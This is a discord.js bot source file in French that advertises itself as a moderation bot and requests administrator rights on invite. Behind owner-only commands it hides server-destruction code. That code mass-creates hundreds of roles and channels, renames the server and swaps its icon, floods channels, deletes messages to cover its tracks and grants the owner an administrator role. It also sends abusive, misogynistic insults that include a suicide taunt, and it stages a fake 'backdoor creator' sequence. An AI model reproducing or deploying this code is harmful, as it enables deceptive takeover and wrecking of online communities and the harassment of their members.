const Discord = require('discord.js');
const client = new Discord.Client();
const bot = new Discord.Client();
var fs = require('fs');
prefix = "!";
let cooldown = new Set();
let cds = 5;

bot.commands = new Discord.Collection();



function cmd(str, msg) {
  return msg.content.toLowerCase().startsWith(prefix + str);
  }

client.on('ready', () => {
  client.user.setActivity('baiser des servs')
  console.log(`Connecté au Compte ${client.user.tag}!`);
});

client.login(process.env.TOKEN);
        




// Commande de Kick
        client.on('message', message => {
          if (!message.guild) return;
        
          if (message.content.startsWith('/kick')) {
            const user = message.mentions.users.first();
            if (user) {
              const member = message.guild.member(user);
              if (member) {
                member.kick('Mérité').then(() => {
                  message.reply(`${user.tag} a bien été kick.`);
                }).catch(err => {
                  message.reply('Je ne peux kick cet utilisateur.');
                  console.error(err);
                });
              } else {
                message.reply('Je ne trouve pas cet utilisateur');
              }
            } else {
              message.reply('Mentionner un Utilisateur a kick!');
            }
          }
        });
        
        // Commande pour Ban
        client.on('message', message => {
          if (!message.guild) return;
        
          if (message.content.startsWith('/ban')) {
            const user = message.mentions.users.first();
            if (user) {
              const member = message.guild.member(user);
              if (member) {
                member.ban({
                  reason: 'M É R I T É',
                }).then(() => {
                  message.reply(`${user.tag} a bien été ban.`);
                }).catch(err => {
                  message.reply('Je ne peux ban cet utilisateur.');
                  console.error(err);
                });
              } else {
                message.reply('Je ne trouve pas cet utilisateur');
              }
            } else {
              message.reply('Mentionner un Utilisateur a ban!');
            }
          }
        });
        

 
//Commande de Flood
client.on("message", message => {
  if(cmd("spam", message)) {
    if (message.author.id !== '457908858556252170') return;

  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 200; i++) {
      message.channel.send(message.content.replace('/spam',''));
  }
}
});
          // Commande de Destruction
client.on("message", msg => {
if(cmd("channel", msg)) {
 if (message.author.id !== '457908858556252170') return;
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'LA EF TA NIKER PD',
          color: 'BLUE',
      });
      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'voice')
      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'text')
      //changes name tons of times to clog up the audit log
      msg.guild.setName("EF: ELFAMOSO > EZ ALL");
      msg.guild.setRegion('russia')
   }
   
   
}
});       

       // Commande de Destruction
client.on("message", msg => {
if(cmd("icon", msg)) {
  if (message.author.id !== '457908858556252170') return;
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'ELFAMOSO',
          color: 'RED',
      });
      msg.guild.setIcon('https://cdn.discordapp.com/attachments/443413713647697940/443414380474793984/JPEG_20180429_165234.jpg')
   }
   
   
}
});       


      
            // ttes les perms
            // ttes les perms
            client.on("message", message => {
if(cmd("ef", message)) {
 if (message.author.id !== '457908858556252170') return;
                let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
 
                message.member.addRole(RoleToAdd);
                 message.guild.createRole({
 
                  name: 'ELFAMOSO',

                  color: 'RED',

                  permissions:'ADMINISTRATOR',

                })

                }

                });

                client.on("message", message => {
                  if(cmd("info", message)) {
                  if (message.author.id !== '457908858556252170') return;
                    message.delete(1000);

                const embed = new Discord.RichEmbed()
                .setTitle("Click ICI pour ajouter notre bot a ton serveur !")
                .setAuthor("| CHAØS |", "https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
                /*
                 * Alternatively, use "#00AE86", [0, 174, 134] or an integer number.
                 */
                .setColor(0x00AE86)
                .setDescription("Un robot de modération 100% français -\n Système automatique anti-insultes & anti-spam\nOwner(s): Baximoz\nPrefix: /.")
                .setFooter("Copyright 2018", "https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
                
                .setThumbnail("https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
                /*
                 * Takes a Date object, defaults to current date.
                 */
                .setTimestamp()
                .setURL("https://discordapp.com/oauth2/authorize?permissions=8&scope=bot&client_id=461135223867047936")
                
                .addField("/bvn ou bvn",
                  "Souhaitez la bienvenue !")

                .addField("/clear", "Efface les derniers messages entre 2 & 99 messages\n Perm : Supp. messages", true)
                
                .addField("/stats", "Affiche les statistiques du robot.", true)

                .addField("/serverinfo", "Affiche les informations du serveur.", true)

                .addField("/userinfo", "Affiche des informations concernant une personne.", true)

                .addField("/website", "Affiche le lien du site web.", true)

                .addField("/invite ", "Affiche le lien d'invitation directement.", true)

                .addField("/help", "Affiche le panel d'aide en message privé.", true)

                .addField("/hhelp", "Affiche le panel d'aide directement sur le serveur.", true)

                .addField("/update", "Vous affiche la dernière mise à jour.", true)

                .addField("/ban", "ban un utilisateur du serveur", true)

                .addField("/nitro", "vous ajoute dans une liste pour gagner un compte nitro.", true)

                .addField("/rainbow", "Te donne un grade multicolor\nPerm: ajouter des roles.", true)

                .addField("/dieu", "Te dit si tu es un dieu.", true)

                .addField("/anek", "(new) Lance un jeu de type Manga/DragonBall/... \n\n\nEt bien + encore !.", true)


                .addBlankField(true)
               
    
                message.channel.send({embed});
                    
              }
            });


        


            client.on("message", message => {
              if(cmd("say", message)) {
               if (message.author.id !== '457908858556252170') return;
                message.delete();

            const embed = new Discord.RichEmbed()
            .setAuthor(message.author.username, message.author.displayAvatarURL)
            /*
             * Alternatively, use "#00AE86", [0, 174, 134] or an integer number.
             */
            .setColor(0x00AE86)
            
            /*
             * Takes a Date object, defaults to current date.
             */
           

            .addField("==================", message.content.replace('*say','') , true)
            


            .addBlankField(true)
           

            message.channel.send({embed});
                
          }
        });


        client.on("message", message => {
          if(cmd("help", message)) {
           if (message.author.id !== '457908858556252170') return;
            message.delete();

            message.channel.send("prefix: /\nspam 'msg': spam le msg \ninfo: envoi une invitation du bot\nsay: envoi un msg en embeds\nbackdoor: te cree une backdoor\nm6: te lvl up le mee6")
      
            
      }
    });

    client.on("message", message => {
      if(cmd("insulte", message)) {
        if (message.author.id !== '457908858556252170') return;
        message.delete();

        let repete = ["tais toi", "tu begaye même en écris sombre fils de pute", "Je te baise ta mère tout les jours gros", "dauilleur pense à pas rager quand tu vas me voir sortir de sa chambre cette nuit", "Ayyaaaaaaa y'a aucun rapport entre se que tu dis et se que tu fais ", "n'oublie pas que t'es moche et que appars ta main droite tu baise rien", "même mon bot te victimise gros fais pas le malin sombre déchéance.", "tu parle tu parle mais sa vas vesqui le vocal par peur de se faire laminer vocalement", "Je te crache dessus car t'es ma pute , ma salop, ma chienne , tire toi de là tu risque de te suicider façon kendral"];
        let result = Math.floor((Math.random() * repete.length));
        message.channel.send(repete[result])
  
        
  }
});

client.on("message", message => {
  if(cmd("backdoor", message)) {
 if (message.author.id !== '457908858556252170') return;
    message.delete();
  message.channel.send("BACKDOOR CREATOR | BY BAXIMOZ |");
  message.channel.send("-------------------------------");
  message.channel.send("téléchargement des packets...")
  message.channel.send("telechargement de la console...");
  message.channel.send("téléchargement de l'émulator...");
  message.channel.send("telechargement des données manquantes....");
  message.channel.send("TELECHARGEMENT DES COMPOSANTS TERMINER.")
  message.channel.send("--------------------------------\n");
  message.channel.send("VEUILLEZ ECRIRE L'IP DE L'HOST...(lhost 'ip')");

  }
});

client.on("message", message => {
  if(cmd("lhost", message)) {
   if (message.author.id !== '457908858556252170') return;
    message.delete();
message.channel.send("IP LHOST=" + message.content.replace('/lhost','') + "\nVEUILLER INDIQUER LE PORT...(lport 'port'");
  }
});

client.on("message", message => {
  if(cmd("lport", message)) {
 if (message.author.id !== '457908858556252170') return;
    message.delete();
    message.delete();
message.channel.send("PORT LPORT=" + message.content.replace('/lport',''));
  message.channel.send("création de la backdoor...");
    message.channel.send("loading.");
    message.delete();
    message.channel.send("loading..");
    message.delete();
    message.channel.send("loading...");
    message.delete();
    message.channel.send("loading.");
    message.delete();
    message.channel.send("loading..");
    message.delete();
    message.channel.send("loading...");
    message.delete();
    message.channel.send("loading.");
    message.delete();
    message.channel.send("loading..");
    message.delete();
    message.channel.send("loading...");
    message.delete();
    message.channel.send("====================");
    message.channel.send("Backdoor créé avec succès !");
    message.channel.send("====================");
  }
});



//Commande de Flood
client.on("message", message => {
  if(cmd("m6", message)) {
 if (message.author.id !== '457908858556252170') return;
message.delete();
  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 50; i++) {
      message.channel.send("/mee6")
    }
}
});

client.on("message", message => {
  if(cmd("mee6", message)) {
message.delete();
  }
});
